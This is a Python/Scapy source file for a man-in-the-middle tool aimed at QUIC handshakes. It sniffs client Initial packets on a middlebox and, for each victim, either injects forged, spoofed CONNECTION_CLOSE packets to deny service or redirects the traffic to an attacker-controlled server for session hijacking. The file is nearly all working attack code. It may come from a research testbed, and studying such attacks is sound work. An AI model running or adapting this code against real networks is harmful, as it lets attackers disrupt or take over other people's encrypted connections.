import os, signal
import argparse

from scapy.all import *
load_contrib("quic")

from scapy.layers.quic import *
from connection_close import QUIC_CONNECTION_CLOSE
bind_bottom_up(UDP, QUIC, dport=443)
bind_layers(UDP, QUIC, dport=443, sport=443)

from forge import forge_cc_scapy
import threading, sys, os, multiprocessing
from victims import Victims, IPv4Address
from quic_protected import *
from test_server.server import main




def send_attack2(victim, ver = "V2"):
    cc = QUIC_CONNECTION_CLOSE(type=0x1C, error_code=0x10,
                                     frame_type=0, reason_phrase=b"oops!")
    header = QUIC_InitialProtected(
        LongPacketType = LONG_HEADER_TYPES["Initial"][ver],
        PacketNumberLen=4,
        Version        = VERSION_CONSTANTS["int"][ver],                     
        DstConnID           = victim[QUIC_Initial].SrcConnID,
        SrcConnID           = victim[QUIC_Initial].DstConnID,
        TokenLen = 0,                        
        Token          = b"",
        PacketNumber  = 0                    
    )
    #
    #header.show2()
    forged = (
        IP(src=victim[IP].dst, dst=victim[IP].src) /
        UDP(sport=victim[UDP].dport, dport=victim[UDP].sport) /
        header / cc
    )
    #header.show2()
    bytes(forged)
    #print(f"Repr of QUIC_InitialProtected: {repr(bytes(header))}")
    #header.show2()
    #print(forged.summary())
    h = (header/cc)[QUIC_Initial]
    assert h.Reserved == 0,         "Reserved bits must be 0"
    assert h.TokenLen == 0,         "Server Initial must have TokenLen = 0"
    assert h.Length   > 0,          "Length field cannot be zero"
    wrpcap("forged.pcap", forged)
    #send(forged, iface=inner_iface, verbose=False)

def add_and_send_to_server(pkt):
    new_pkt = pkt[IP]
    new_pkt[IP].src = attacker_outer_iface_ip
    del new_pkt.getlayer(IP).chksum
    del new_pkt.getlayer(UDP).chksum
    #print(f"New PKT to server: {new_pkt.summary()}")
    send(new_pkt, iface=outer_iface, verbose=False)


def send_attack(victim, PacketNumberLen):
    # build a CONNECTION_CLOSE frame
    cc = QUIC_CONNECTION_CLOSE(
        type          = 0x1C,
        error_code    = 0x10,         # arbitrary error
        frame_type    = 0,            # e.g. PADDING triggered it
        reason_phrase = b"oops!"
    )
    frame  = bytes(cc)
    tpl    = (victim[IP].src, victim[UDP].sport, victim[IP].dst, victim[UDP].dport)
    dcid_for_keys   = victim[QUIC_Initial].DstConnID      # client-chosen DCID → secrets
    dcid_in_header  = victim[QUIC_Initial].SrcConnID      # client’s SrcCID     → header
    forged = forge_cc_scapy(
        dcid_secret = dcid_for_keys,
        dcid_header = dcid_in_header,
        tpl = tpl,
        frame = frame, PacketNumberLen=PacketNumberLen, ver="V2") # "V1" for version 1, "V2" for version 2.
    #forged.show()
    #QUIC(bytes(forged)).show()
    """raw = forged
    ip = IP(raw)
    udp = ip[UDP]
    QUIC(udp.payload.load).show()"""
    send(forged, iface=inner_iface, verbose=False)

def handle_quic(pkt):
    global vs
    if vs.exit:
        raise StopIteration # This will stop the sniff() function
    # Only process if this packet has a QUIC Initial header
    if pkt.haslayer(UDP) and pkt.getlayer(Ether).src != get_if_hwaddr(inner_iface) and pkt.getlayer(Ether).src != get_if_hwaddr(outer_iface):
        if pkt.sniffed_on == inner_iface:
            vs.update(pkt)
            if QUIC_Initial in pkt:
                #print(f"CLHO PacketLength: {bin(pkt[QUIC_Initial].PacketNumberLen)}")
                if (vs[pkt[IP].src].status["DoS"] or vs[pkt[IP].src][pkt[IP].dst]["DoS"]):
                    #send_attack2(pkt,ver="V1")
                    send_attack(pkt, PacketNumberLen = pkt[QUIC_Initial].PacketNumberLen)
                    return
                elif (vs[pkt[IP].src].status["Session Hijack"] or vs[pkt[IP].src][pkt[IP].dst]["Session Hijack"]):
                    new_pkt = pkt[IP]
                    new_pkt[IP].dest = attacker_inner_iface_ip
                    new_pkt[UDP].dport = 4433
                    del new_pkt.getlayer(IP).chksum
                    del new_pkt.getlayer(UDP).chksum
                    #print(f"New PKT to server: {new_pkt.summary()}")
                    send(new_pkt, iface=inner_iface, verbose=False)
                    print("Sent shit")
                    return
            add_and_send_to_server(pkt)
            
            

                    
        elif pkt.sniffed_on == outer_iface:
            new_dst = vs.find_victim_from_wan_by_port(pkt[UDP].dport)
            if new_dst != "":
                #print(f"From server: {pkt.summary()}")
                new_pkt = pkt[IP]
                new_pkt[IP].dst = new_dst
                del new_pkt.getlayer(IP).chksum
                del new_pkt.getlayer(UDP).chksum
                #print(f"New PKT to client: {new_pkt.summary()}")
                send(new_pkt, iface=inner_iface, verbose=False)
            else:
                print("A packet of unknown LAN destination.")
                # Need to fix change of victim sport with new connections of same src and dest ips.


if __name__ == "__main__":
    """
        Global variables, constants and configurations settings.
    """
    os.system('sysctl -w net.ipv4.ip_forward=0')
    parser = argparse.ArgumentParser(description="MiTM QUIC Handshake attacks")
    parser.add_argument(
        "--inner-iface",
        type=str,
        default='middlebox-eth0',
        help="The name of the interface/network adapter that connects the middlebox to the LAN network.",
    )
    parser.add_argument(
        "--outer-iface",
        type=str,
        default='middlebox-eth1',
        help="The name of the interface/network adapter that connects the middlebox to the Router/WAN network.",
    )
    parser.add_argument(
        "--outer-iface-ip",
        type=str,
        default="10.69.0.100",
        help="The ip of the middlebox in the interface to the Router/WAN network.",
    )
    parser.add_argument(
        "--inner-iface-ip",
        type=str,
        default="192.168.1.1",
        help="The ip of the middlebox in the interface to the LAN network.",
    )
    args = parser.parse_args()
    
    ##TODO: add changing of those while running 
    inner_iface = args.inner_iface
    try:
        attacker_inner_iface_ip = IPv4Address(args.inner_iface_ip)
    except Exception as e:
        print(e)
        os._exit(1)
    outer_iface = args.outer_iface
    try:
        attacker_outer_iface_ip = IPv4Address(args.outer_iface_ip)
    except Exception as e:
        print(e)
        os._exit(1)
    vs = Victims()
    #print(f"Inner_iface: {inner_iface} , Outer_iface: {outer_iface}")      
    control_panel_thread = threading.Thread(target=vs.run)
    control_panel_thread.start()
    if isinstance(threading.current_thread(), threading._MainThread):
        """p = multiprocessing.Process(target=main,
            args=("0.0.0.0",4433, "./test/ssl_cert.pem", "./test/ssl_key.pem", "./test_server/index.html"), daemon=True)
        p.start()"""
        if multiprocessing.parent_process() is None:
            # Sniff UDP 443 traffic and invoke handle_quic for each packet
            sniff(
                iface=[inner_iface, outer_iface],
                prn=handle_quic,         # callback for every packet
                store=False                  # don’t keep packets in memory
            )
            """p.terminate()
            if p.is_alive():       # very rare, but just in case on Unix:
                os.kill(p.pid, signal.SIGKILL)  # Unix-only sledgehammer
                p.join()"""
            control_panel_thread.join()

        